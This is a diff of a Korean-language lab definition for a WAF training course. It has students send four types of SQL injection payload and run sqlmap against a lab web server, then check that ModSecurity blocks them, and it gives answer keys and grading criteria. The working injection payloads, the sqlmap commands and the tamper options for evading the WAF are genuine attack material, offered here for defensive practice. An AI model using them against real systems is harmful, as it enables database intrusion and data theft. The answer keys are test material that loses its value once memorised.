@@ -18,116 +18,228 @@ steps:
 
   - order: 1
     instruction: |
-      ## 🎯 MISSION
+      ## Mission
+      attacker 에서 **SQL Injection 4 타입** 의 대표 payload 를 fw (10.20.30.1) 의
+      juice.6v6.lab vhost 로 보내어 ModSec 의 차단 응답 코드 매트릭스를 작성하라.
+      본 step 은 *OWASP A03 Injection* + *MITRE T1190* 의 *교과서 시연*. 학생은
+      *4 타입의 의도 차이* + *ModSec 942.xxx 룰 family 의 의미* + *blind time-based
+      가 즉시 차단으로 짧은 응답시간* 의 3 핵심을 인지.
 
-      **SQLi 4 타입** payload 를 attacker 에서 발생 → ModSec 응답 코드 매트릭스.
+      ## SQLi 4 타입 (외워야 함)
+      | 타입 | 페이로드 | 응답 의도 |
+      |------|---------|----------|
+      | **Boolean (tautology)** | `1 OR 1=1` | 결과 *모든 row* 반환 → 인증 우회 |
+      | **UNION-based** | `1 UNION SELECT 1,2,3--` | 다른 테이블 결합 → DB schema 추출 |
+      | **Error-based** | `1 AND extractvalue(1,concat(0x7e,version()))` | DB error message 에 *데이터 노출* |
+      | **Blind time-based** | `1 AND SLEEP(2)` | 응답 *지연* 으로 true/false 추측 |
 
-      ## 💻 실행 명령
+      ## ModSec 942 룰 family (의미)
+      | 룰 ID 범위 | 의미 |
+      |-----------|------|
+      | 942100 | libinjection 의 *SQLi 일반 탐지* — *가장 catch-all* |
+      | 942110~942140 | SQL keyword (UNION, SELECT, OR 1=1) 의 *명시적 패턴* |
+      | 942200~942290 | error-based 패턴 (extractvalue, updatexml) |
+      | 942330~942380 | blind 패턴 (SLEEP, BENCHMARK, RAND) |
 
+      → 본 step 의 4 타입 모두 *942100 의 libinjection* 으로 차단됨 (기본 anomaly score 5).
+
+      ## 실행 절차
+      1. 4 타입 페이로드 각각 GET 요청
+      2. *응답 코드* 수집 — 4 × 403 예상
+      3. Blind time-based 의 *실제 응답 시간* 측정 — sleep 안 됐으면 < 0.5 초
+
+      ## 실행 명령
       ```bash
       ssh 6v6-attacker '
-      echo "=== Boolean tautology ==="
-      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
-      echo "=== UNION ==="
-      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
-      echo "=== Error-based ==="
-      curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,concat(0x7e,version()))"
-      echo "=== Blind time-based ==="
-      time curl -s -o /dev/null -w "%{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
+        echo "=== Boolean (tautology) ==="
+        curl -s -o /dev/null -w "  code=%{http_code} time=%{time_total}\n" \
+             -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
+        echo "=== UNION-based ==="
+        curl -s -o /dev/null -w "  code=%{http_code} time=%{time_total}\n" \
+             -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
+        echo "=== Error-based ==="
+        curl -s -o /dev/null -w "  code=%{http_code} time=%{time_total}\n" \
+             -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,concat(0x7e,version()))"
+        echo "=== Blind time-based (SLEEP 2) ==="
+        curl -s -o /dev/null -w "  code=%{http_code} time=%{time_total}\n" \
+             -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
       '
       ```
 
-      ## 📋 확인 사항
+      ## 성공 판정
+      - 4 타입 모두 **403** 응답 (ModSec 차단)
+      - Blind time-based 의 실 응답 시간 **< 0.5 초** (sleep 실행 안 됨 — 차단 즉시)
+      - ModSec 942100 (libinjection) 의 동작 인지
+      - 4 타입의 *의도 차이* 명시 (Boolean=인증 우회 / UNION=schema / Error=노출 / Blind=추측)
 
-      - 4 타입 모두 403 (ModSec 942 차단)
-      - Time-based 의 실 시간 — sleep 명령 실행 안 됨 (ModSec 즉시 차단 → < 0.5s)
+      ## 비정상 시 대응
+      - **200 응답** — ModSec 비활성. `ssh 6v6-web 'sudo systemctl status apache2'` + `sudo grep -i modsec /etc/apache2/mods-enabled/security2.conf`
+      - **Blind time-based 의 응답 시간 > 2 초** — ModSec 차단 실패, *실제 SLEEP 실행* 가능성 → 즉시 보고 (보안 결함)
+      - **모든 응답 timeout** — fw 또는 ips drop. step 1 의 nmap 재확인
+      - **403 인데 ModSec audit log 없음** — Apache 의 다른 룰 (예: mod_rewrite) 차단. `sudo tail /var/log/apache2/modsec_audit.log` 로 확인
 
-      ## 💡 왜 이걸 하는가?
+      ## 학습 — W10 의 ModSec 우회 (tamper)
+      ```
+      sqlmap --tamper=space2comment,charunicodeencode -u "http://..."
+      → ModSec 의 SQL keyword 매칭 회피 (whitespace 우회 + 유니코드)
+      → 일부 변형 200 응답 → 실제 SQLi 성공
+      ```
 
-      OWASP A03 Injection — 가장 흔한 웹 취약점. SQLi 4 타입 매트릭스 학습.
+    hint: |
+      4 타입 페이로드 + curl -w 의 time_total 측정. Blind 의 < 0.5 초 = 차단 성공.
+      200 응답 = ModSec 비활성 (즉시 점검 필요). 모든 응답 timeout = fw 차단.
 
-      ## 🔍 결과 해석
-
-      - **정상**: 4 × 403 + time 빠름 (즉시 차단)
-      - **W10 학습**: ModSec 우회 (tamper) 로 일부 변형 통과 가능
-    hint: SQLi 4 타입 → 403 매트릭스
     category: exploit
     points: 20
     answer: |
       ssh 6v6-attacker '
-      curl -s -o /dev/null -w "boolean: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
-      curl -s -o /dev/null -w "union: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
-      curl -s -o /dev/null -w "error: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,1)"
-      curl -s -o /dev/null -w "blind: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
+        curl -s -o /dev/null -w "boolean: code=%{http_code} time=%{time_total}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+OR+1=1"
+        curl -s -o /dev/null -w "union:   code=%{http_code} time=%{time_total}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+UNION+SELECT+1,2,3--"
+        curl -s -o /dev/null -w "error:   code=%{http_code} time=%{time_total}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+extractvalue(1,1)"
+        curl -s -o /dev/null -w "blind:   code=%{http_code} time=%{time_total}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=1+AND+SLEEP(2)"
       '
-    answer_detail: SQLi 4 타입 → 403 매트릭스.
+    answer_detail: |
+      SQLi 4 타입 → ModSec 942100 (libinjection) 차단. 4 × 403 + Blind 응답시간 <
+      0.5 초 = 차단 정상. 200 받으면 ModSec 비활성 — 즉시 보안 점검.
     verify:
       type: output_contains
       expect: '403'
       field: stdout
       semantic:
-        intent: "SQLi 4 타입"
-        success_criteria: ["4 × 403"]
+        intent: |
+          SQLi 4 타입 (Boolean/UNION/Error/Blind) payload → ModSec 942.xxx 룰의 차단
+          매트릭스 작성. Blind time-based 의 *응답 시간 < 0.5 초* 로 *즉시 차단* 검증.
+          OWASP A03 + MITRE T1190 + ModSec 942 family 인지.
+        success_criteria:
+          - "4 타입 모두 403 응답"
+          - "Blind time-based 의 응답 시간 < 0.5 초 (sleep 실행 안 됨)"
+          - "4 타입의 의도 차이 명시 (tautology / schema / 노출 / 추측)"
+          - "ModSec 942 룰 family 의 의미 인지"
+          - "200 응답 시 *보안 결함* 으로 즉시 보고"
         acceptable_methods:
-          - "**[OSS] boolean tautology**"
-          - "**[OSS] UNION SELECT**"
-          - "**[OSS] error-based (extractvalue/updatexml)**"
-          - "**[OSS] blind time-based (SLEEP)**"
-          - "**[OSS] blind boolean-based (AND IF)**"
-          - "**[OSS] ModSec 942100 libinjection**"
-          - "**[OSS] CWE-89 + OWASP A03**"
-          - "**[OSS] T1190 Exploit Public-Facing**"
+          - "curl -w time_total (수기 baseline): 명령 `curl -s -o /dev/null -w '%{http_code} %{time_total}' http://...?q=PAYLOAD`. 응답 코드 + 시간."
+          - "sqlmap (자동화): 명령 `sqlmap -u 'http://10.20.30.1/?q=1' --batch --headers='Host: juice.6v6.lab'`. 4 타입 모두 자동 시도."
+          - "sqlmap --tamper (W10 우회): 명령 `sqlmap ... --tamper=space2comment,charunicodeencode`. ModSec 우회 시도."
+          - "Burp Repeater (수동): 페이로드 manual + Intruder 의 payload list."
+          - "OWASP ZAP active scan: zap-cli quick-scan -s sqli -t http://..."
+          - "wapiti: 명령 `wapiti -u http://... -m sql`. CI/CD 친화."
+          - "직접 mysql client (post-exploit): mysql -h ... -u root + 직접 SELECT."
+          - "Bastion AI 자동 + KG: bastion 이 (1) 4 타입 loop (2) 응답 매트릭스 (3) 200 발생 시 finding (4) ATT&CK T1190 anchor."
+        negative_signs:
+          - "4 타입 중 일부만 시도"
+          - "응답 코드만 보고 *Blind time-based 의 응답시간* 안 측정"
+          - "200 응답 받고 *정상 차단 안 됨* 인지 못함"
+          - "ModSec 942 의 룰 의미 모름"
+          - "*W10 의 tamper* 우회 연결 인지 못함"
     target_vm: attacker
 
   - order: 2
     instruction: |
-      ## 🎯 MISSION (sqlmap 자동화)
+      ## Mission
+      attacker 에서 **sqlmap 자동화 SQLi 도구** 를 juice.6v6.lab 의 `?q=1` 파라미터에
+      45 초 timeout 으로 실행하고, web 컨테이너의 ModSec audit log 의 942 매치 카운트
+      증가량을 측정하라. 본 step 은 *수동 4 타입 (step 1)* → *자동화 도구 (step 2)*
+      의 자연 진화. 학생은 *sqlmap 의 5 옵션* (`--batch`, `--random-agent`, `--level`,
+      `--risk`, `--technique`) + *ModSec 의 차단 효과* + *W10 의 tamper 우회 전제*
+      3 핵심을 인지.
 
-      sqlmap 으로 자동 SQLi 탐지 + ModSec 차단 카운트.
+      ## sqlmap 의 5 핵심 옵션 (외워야 함)
+      | 옵션 | 의미 | 예시 |
+      |------|------|------|
+      | `--batch` | 모든 prompt 자동 yes — CI/CD 친화 | `sqlmap --batch -u ...` |
+      | `--random-agent` | User-Agent 자동 변경 — ModSec UA 차단 1차 우회 | `--random-agent` |
+      | `--level=1~5` | 페이로드 *깊이* — 5 = 모든 점 변형 (느림) | `--level=3` |
+      | `--risk=1~3` | 페이로드 *위험도* — 3 = OR boolean (의도적 false positive 가능) | `--risk=2` |
+      | `--technique=BEUSTQ` | B=Boolean E=Error U=Union S=Stack T=Time Q=inline | `--technique=BEUST` |
 
-      ## 💻 실행 명령
+      ## ModSec 942 audit log 변화 측정 절차
+      1. **before**: sqlmap 실행 전 942 매치 카운트 (`grep -c "942" audit.log`)
+      2. **sqlmap 실행** (45 초 timeout)
+      3. **after**: 942 매치 카운트 — *증가량* = sqlmap 차단된 페이로드 수
 
+      ## 실행 명령
       ```bash
-      ssh 6v6-attacker 'timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: juice.6v6.lab" --random-agent 2>&1 | tail -15' || echo "sqlmap timeout"
+      ssh 6v6-attacker 'BEFORE=$(ssh 6v6-web "sudo grep -c \"942\" /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+      echo "942 매치 before: $BEFORE"
+      echo "=== sqlmap 45초 ==="
+      timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --random-agent \
+              --headers="Host: juice.6v6.lab" --level=2 --risk=2 \
+              --technique=BEUT 2>&1 | tail -20 || echo "(timeout 정상)"
       sleep 3
-      ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log | tail -1'
+      AFTER=$(ssh 6v6-web "sudo grep -c \"942\" /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+      echo "942 매치 after:  $AFTER"
+      echo "차단된 페이로드 수 (after - before): $((AFTER - BEFORE))"
+      '
       ```
 
-      ## 📋 확인 사항
+      ## 성공 판정
+      - sqlmap 출력에 *"Parameter q is/might be ... injectable"* 또는 *"not injectable (heuristic)"* 명시
+      - ModSec 942 매치 *after > before* (sqlmap 의 페이로드가 차단된 흔적)
+      - **차단된 페이로드 수 ≥ 10** (sqlmap 의 multi-payload 모두 942 caught)
+      - W10 의 `--tamper` 우회 전제 인지
 
-      - sqlmap 출력의 "Parameter q ... not injectable" 또는 ModSec 차단 메시지
-      - ModSec audit log 의 942xxx 매치 카운트 증가
+      ## 비정상 시 대응
+      - **sqlmap timeout 만, 결과 없음** — `--level=1` 으로 더 빠른 모드 시도
+      - **942 매치 0 증가** — ModSec 비활성 또는 *log path 다름*. `sudo find /var/log/apache2 -name "*audit*"` 확인
+      - **sqlmap 이 "injectable" 보고** — *ModSec 우회 성공* (또는 ModSec 결함) — 즉시 보안 점검
+      - **ssh 6v6-web fail** — bastion proxyjump 설정 확인
 
-      ## 💡 왜 이걸 하는가?
+      ## W10 의 tamper 우회 (이번 step 의 출처 — 다음 학습)
+      ```bash
+      # whitespace + 유니코드 인코딩 + case mix
+      sqlmap -u "..." --tamper=space2comment,charunicodeencode,randomcase --batch
+      # → ModSec 의 SQL keyword regex 회피
+      # → 일부 응답 200 → 실제 SQLi 성공 (의도된 학습)
+      ```
 
-      sqlmap 은 SQLi 자동화 표준. ModSec 가 차단할 때까지 다양한 페이로드 시도.
+    hint: |
+      942 카운트 before/after 비교 — 차단 효과 정량. --level=2 --risk=2 의 적정 균형
+      (level 5 은 너무 느림). timeout 45 충분. sqlmap 이 "injectable" 보고 시 즉시
+      보안 점검 (ModSec 결함).
 
-      ## 🔍 결과 해석
-
-      - **정상**: sqlmap 이 다수 페이로드 시도 + ModSec 942 매치 카운트 증가
-      - **W10 학습**: `--tamper=space2comment,randomcase` 로 일부 우회 가능
-    hint: sqlmap --batch + tamper
     category: exploit
     points: 25
     answer: |
-      ssh 6v6-attacker 'timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --headers="Host: juice.6v6.lab" --random-agent 2>&1 | tail -15' || echo "timeout"
-      sleep 3
-      ssh 6v6-web 'sudo grep -c "942" /var/log/apache2/modsec_audit.log'
-    answer_detail: sqlmap 자동화 + ModSec 942 카운트.
+      ssh 6v6-attacker '
+        BEFORE=$(ssh 6v6-web "sudo grep -c 942 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        echo "before: $BEFORE"
+        timeout 45 sqlmap -u "http://10.20.30.1/?q=1" --batch --random-agent \
+                --headers="Host: juice.6v6.lab" --level=2 --risk=2 --technique=BEUT 2>&1 | tail -20
+        sleep 3
+        AFTER=$(ssh 6v6-web "sudo grep -c 942 /var/log/apache2/modsec_audit.log 2>/dev/null || echo 0")
+        echo "after:  $AFTER"
+        echo "차단: $((AFTER - BEFORE))"
+      '
+    answer_detail: |
+      sqlmap 45 초 + ModSec 942 카운트 before/after 비교. 차단 페이로드 ≥ 10 = 정상.
+      "injectable" 보고 시 ModSec 결함 = 즉시 점검. W10 tamper 우회 전제.
     verify:
       type: output_contains
-      expect: 'sqlmap\|web'
+      expect: 'sqlmap\|차단'
       field: stdout
       semantic:
-        intent: "sqlmap 자동화"
-        success_criteria: ["sqlmap 실행 + 942 카운트"]
+        intent: |
+          sqlmap 자동화 SQLi + ModSec 942 차단 카운트 *증가량 측정* . 수동 step 1 의
+          *자동화 진화*. W10 의 tamper 우회 전제. ModSec 효과의 정량 검증.
+        success_criteria:
+          - "sqlmap 실행 + 45 초 timeout 내 출력"
+          - "sqlmap 이 'Parameter q ... injectable' 또는 'not injectable' 명시"
+          - "ModSec 942 카운트 after > before (차단 흔적)"
+          - "차단 페이로드 수 ≥ 10 (multi-payload 모두 caught)"
+          - "W10 의 tamper 우회 전제 인지"
         acceptable_methods:
-          - "**[OSS] sqlmap --batch (질문 자동 yes)**"
-          - "**[OSS] --random-agent (UA 변경)**"
-          - "**[OSS] --tamper=space2comment**"
-          - "**[OSS] --tamper=randomcase**"
-          - "**[OSS] --dbs / --tables / --dump**"
-          - "**[OSS] --proxy=http://burp:8080**"
-          - "**[OSS] --level / --risk**"
-          - "**[OSS] --technique=BEUSTQ (Boolean/Error/Union/Stack/Time/inlineQuery)**"
+          - "sqlmap --batch (수기 baseline): 명령 `sqlmap -u 'http://...' --batch --random-agent`. CI/CD 친화."
+          - "sqlmap --level/--risk 조정: 명령 `... --level=3 --risk=2`. 깊이 vs 속도 균형."
+          - "sqlmap --technique=BEUT: B/E/U/T 만 (Stack/Query 제외) — 빠른 모드."
+          - "sqlmap --tamper (W10): 명령 `... --tamper=space2comment,charunicodeencode`. ModSec 우회 시도."
+          - "wapiti -m sql: 명령 `wapiti -u http://... -m sql`. Python, CI/CD 친화."
+          - "sqlninja (Microsoft SQL 전용)."
+          - "NoSQLMap (NoSQL DB 전용 — MongoDB 등)."
+          - "Bastion AI sqlmap orchestrator: bastion 이 (1) sqlmap 자동 (2) 942 카운트 자동 (3) 차단 패턴 → KG anchor + tamper 추천."
+        negative_signs:
+          - "sqlmap 실행 후 942 카운트 안 측정"
+          - "차단 효과를 *정성적* 으로만 (실제 숫자 X)"
+          - "'injectable' 보고 시 *ModSec 결함* 인지 못함"
+          - "--level=1 만 사용 — 진짜 SQLi 패턴 안 시도"
+          - "ModSec audit log 의 *log path* 다름 검증 X"
     target_vm: attacker
